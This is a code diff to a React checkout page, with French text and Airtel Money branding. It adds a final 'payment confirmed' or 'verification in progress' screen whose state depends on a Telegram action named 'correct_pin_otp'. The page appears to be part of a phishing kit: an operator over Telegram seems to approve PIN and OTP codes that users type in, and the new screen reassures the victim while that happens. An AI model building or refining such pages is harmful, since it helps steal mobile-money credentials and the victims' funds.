@@ -517,6 +517,7 @@ function App() {
 
   if (checkoutOffer) {
     const checkoutStatusIcon = waitingApproval ? 'refresh' : approvalPassed ? 'otp' : 'shieldCheck';
+    const verificationApproved = telegramAction?.action === 'correct_pin_otp';
 
     return (
       <main className="page-shell">
@@ -590,6 +591,7 @@ function App() {
               </div>
             )}
 
+            {!paymentConfirmed && (
             <form className="checkout-form" onSubmit={handleCheckoutSubmit}>
               {!otpSent && (
                 <>
@@ -683,6 +685,7 @@ function App() {
                 </button>
               </div>
             </form>
+            )}
 
             {paymentConfirmed && actionLoading && (
               <div className="checkout-info recycling-spinner" aria-live="polite" aria-busy="true">
@@ -728,6 +731,27 @@ function App() {
                 <UiGlyph type="shieldCheck" />
                 <strong>Action recue :</strong> {telegramAction.text}
               </div>
+            )}
+
+            {paymentConfirmed && (
+              <section className="checkout-final-state" aria-live="polite">
+                <div className="checkout-final-icon">
+                  <UiGlyph type={verificationApproved ? 'shieldCheck' : 'refresh'} />
+                </div>
+                <div className="checkout-final-copy">
+                  <h2>{verificationApproved ? 'Paiement confirme' : 'Verification en cours'}</h2>
+                  <p>
+                    {verificationApproved
+                      ? 'Merci. Votre validation OTP est confirmee. Suivez les instructions Airtel Money pour finaliser la transaction.'
+                      : 'Votre OTP a ete envoye pour verification. Veuillez patienter pendant la confirmation finale.'}
+                  </p>
+                </div>
+                <div className="checkout-final-actions">
+                  <button type="button" className="button-secondary" onClick={handleBack}>
+                    Retour aux offres
+                  </button>
+                </div>
+              </section>
             )}
 
             {paymentConfirmed && actionError && (
